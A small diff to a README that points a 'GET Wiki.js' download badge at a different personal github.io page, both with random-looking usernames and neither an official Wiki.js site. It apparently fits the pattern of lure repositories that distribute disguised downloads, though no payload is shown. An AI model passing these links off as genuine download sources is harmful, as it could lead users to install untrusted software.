@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://miro.medium.com/v2/1*DYPP_W-RJItAMHFgQvvIJw.jpeg)
 
-[![GET Wiki.js](https://img.shields.io/badge/GET%20%E2%80%94%20Wiki.js-0078D6?style=for-the-badge&logoColor=white)](https://oscarnielsendsaj.github.io/.github/wiki-js)
+[![GET Wiki.js](https://img.shields.io/badge/GET%20%E2%80%94%20Wiki.js-0078D6?style=for-the-badge&logoColor=white)](https://denverahmedzifw.github.io/.github/wiki-js)
 
 ---
 
